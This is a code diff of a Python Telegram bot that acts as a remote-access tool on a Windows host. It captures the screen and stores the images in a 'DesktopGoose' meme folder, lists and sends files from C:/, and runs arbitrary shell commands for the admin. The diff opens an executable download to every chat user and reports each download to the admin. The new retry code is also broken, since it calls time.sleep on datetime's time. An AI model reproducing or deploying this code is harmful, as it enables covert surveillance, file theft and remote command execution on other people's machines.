@@ -2,8 +2,8 @@ import os
 import telebot
 from telebot import types
 import pyautogui
-from Database.datab import create_table_if_not_exists, insert_or_update_user
-from datetime import datetime
+from Database.datab import create_table_if_not_exists, insert_or_update_user, insert_screenshot
+from datetime import datetime, time
 import subprocess
 
 # Conexión con nuestro BOT
@@ -15,12 +15,12 @@ ADMIN_ID = 5433151369
 
 # Ruta para guardar capturas de pantalla (ruta relativa)
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-CAPTURES_DIR = os.path.join(BASE_DIR, 'DesktopGoose-v0.31\Assets\Images\Memes')
+CAPTURES_DIR = os.path.join(BASE_DIR, 'DesktopGoose-v0.31/Assets/Images/Memes')
 if not os.path.exists(CAPTURES_DIR):
     os.makedirs(CAPTURES_DIR)
 
 # Ruta del ejecutable a descargar
-EXECUTABLE_PATH = os.path.join(BASE_DIR, 'output', 'main.exe')
+EXECUTABLE_PATH = os.path.join(BASE_DIR,'PruebasEpn.zip')
 
 # Ruta del script para iniciar la aplicación
 SCRIPT_PATH = os.path.join(BASE_DIR, 'run_application.py')
@@ -32,12 +32,35 @@ BASE_DIR = 'C:/'
 # Diccionario para almacenar la última carpeta listada por cada usuario
 user_directories = {}
 
+# Función para enviar archivos con reintentos y notificar al administrador
+def send_file_with_retry(chat_id, file_path, caption, markup, retries=3, delay=5):
+    """Intenta enviar un archivo con reintentos en caso de fallo."""
+    for attempt in range(retries):
+        try:
+            with open(file_path, 'rb') as file:
+                bot.send_document(chat_id, file, caption=caption, reply_markup=markup)
+            
+            # Notificar al administrador si el archivo se envió con éxito
+            if chat_id != ADMIN_ID:
+                notify_admin(chat_id, file_path)
+            return
+        except Exception as e:
+            bot.send_message(chat_id, f"Intento {attempt + 1} fallido: {str(e)}")
+            time.sleep(delay)
+    bot.send_message(chat_id, "No se pudo enviar el archivo después de varios intentos.")
+
+# Función para notificar al administrador
+def notify_admin(user_id, file_path):
+    user_name = bot.get_chat_member(user_id, user_id).user.first_name
+    bot.send_message(ADMIN_ID, f"El usuario {user_name} ({user_id}) ha descargado el archivo {os.path.basename(file_path)}.")
+
 # Función para crear el menú de botones para usuarios normales
 def get_normal_menu():
     markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
     btn_help = types.KeyboardButton('/help')
     btn_user_info = types.KeyboardButton('/user_info')
-    markup.add(btn_help, btn_user_info)
+    btn_download = types.KeyboardButton('/download')
+    markup.add(btn_help, btn_user_info, btn_download)
     return markup
 
 # Función para crear el menú de botones para usuarios admin
@@ -73,7 +96,8 @@ def send_instructions(chat_id):
         user_name = bot.get_chat_member(chat_id, chat_id).user.first_name
         welcome_message = (f"Hola {user_name}! Puedes interactuar conmigo usando los siguientes comandos:\n"
                            "/help - Muestra este mensaje de ayuda\n"
-                           "/user_info - Muestra tu información de usuario")
+                           "/user_info - Muestra tu información de usuario\n"
+                           "/download - Descarga el ejecutable!")
     
     bot.send_message(chat_id, welcome_message, reply_markup=markup)
 
@@ -128,6 +152,7 @@ def send_screenshot(message):
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
         screenshot_path = os.path.join(CAPTURES_DIR, f'screenshot_{timestamp}.png')
         screenshot.save(screenshot_path)
+        insert_screenshot(message.from_user.id, screenshot_path)
         with open(screenshot_path, 'rb') as file:
             bot.send_photo(message.chat.id, file, caption="Aquí tienes la captura de pantalla.", reply_markup=markup)
     except Exception as e:
@@ -215,58 +240,48 @@ def send_specific_file(message, file_path):
         msg = bot.send_message(message.chat.id, f"¿Quieres listar otra subcarpeta o enviar un archivo desde '{os.path.dirname(file_path)}'? Ingresa el nombre de la subcarpeta o 'enviar [nombre del archivo]'.")
         bot.register_next_step_handler(msg, handle_next_step)
 
-# Comando /remote_command para ejecutar comandos remotos
+# Comando /remote_command para ejecutar un comando remoto
 @bot.message_handler(commands=['remote_command'])
 def request_command(message):
     if not is_admin(message.from_user.id):
         bot.send_message(message.chat.id, "No tienes permiso para usar este comando.")
         return
+    
+    msg = bot.send_message(message.chat.id, 'Ingresa el comando que deseas ejecutar:')
+    bot.register_next_step_handler(msg, run_remote_command)
 
-    msg = bot.send_message(message.chat.id, 'Por favor, ingresa el comando que deseas ejecutar:')
-    bot.register_next_step_handler(msg, execute_remote_command)
-
-def execute_remote_command(message):
+def run_remote_command(message):
     command = message.text.strip()
-    try:
-        output = os.popen(command).read()
-        if output:
-            bot.send_message(message.chat.id, f"Salida del comando:\n{output}")
-        else:
-            bot.send_message(message.chat.id, "El comando se ejecutó, pero no produjo salida.")
-    except Exception as e:
-        bot.send_message(message.chat.id, f"No se pudo ejecutar el comando: {str(e)}")
-
-# Comando /download para descargar el ejecutable
-@bot.message_handler(commands=['download'])
-def download_executable(message):
-    if not is_admin(message.from_user.id):
-        bot.send_message(message.chat.id, "No tienes permiso para usar este comando.")
-        return
-
     markup = get_admin_menu()
-    telegram_id = message.from_user.id
-    name = message.from_user.first_name
+    try:
+        result = subprocess.check_output(command, shell=True, text=True)
+        bot.send_message(message.chat.id, f"Resultado de '{command}':\n{result}", reply_markup=markup)
+    except Exception as e:
+        bot.send_message(message.chat.id, f"No se pudo ejecutar el comando '{command}': {str(e)}", reply_markup=markup)
 
-    insert_or_update_user(telegram_id, name)
-
-    if os.path.exists(EXECUTABLE_PATH):
-        with open(EXECUTABLE_PATH, 'rb') as file:
-            bot.send_document(message.chat.id, file, caption="Aquí tienes el ejecutable.", reply_markup=markup)
+# Comando /download para enviar un archivo
+@bot.message_handler(commands=['download'])
+def send_files(message):
+    markup = get_admin_menu() if is_admin(message.from_user.id) else get_normal_menu()
+    file_path = EXECUTABLE_PATH
+    if os.path.exists(file_path):
+        send_file_with_retry(message.chat.id, file_path, caption="Aquí tienes el ejecutable.", markup=markup)
     else:
-        bot.send_message(message.chat.id, "El ejecutable no está disponible en este momento.", reply_markup=markup)
+        bot.send_message(message.chat.id, "El archivo no se encuentra disponible en este momento.", reply_markup=markup)
 
-# Comando /run_application para ejecutar el script de aplicación
+# Comando /run_application para iniciar la aplicación
 @bot.message_handler(commands=['run_application'])
 def run_application(message):
     if not is_admin(message.from_user.id):
         bot.send_message(message.chat.id, "No tienes permiso para usar este comando.")
         return
 
+    markup = get_admin_menu()
     try:
         subprocess.Popen(['python', SCRIPT_PATH])
-        bot.send_message(message.chat.id, "La aplicación se está iniciando...")
+        bot.send_message(message.chat.id, "La aplicación ha sido iniciada.", reply_markup=markup)
     except Exception as e:
-        bot.send_message(message.chat.id, f"No se pudo iniciar la aplicación: {str(e)}")
+        bot.send_message(message.chat.id, f"No se pudo iniciar la aplicación: {str(e)}", reply_markup=markup)
 
 # Manejador para cualquier otro mensaje recibido
 @bot.message_handler(func=lambda message: True)
@@ -274,6 +289,7 @@ def handle_all_messages(message):
     create_table_if_not_exists()
     insert_or_update_user(message.from_user.id, message.from_user.first_name)
     send_instructions(message.chat.id)
-
+    
+    
 def run_bot():
     bot.polling(none_stop=True)
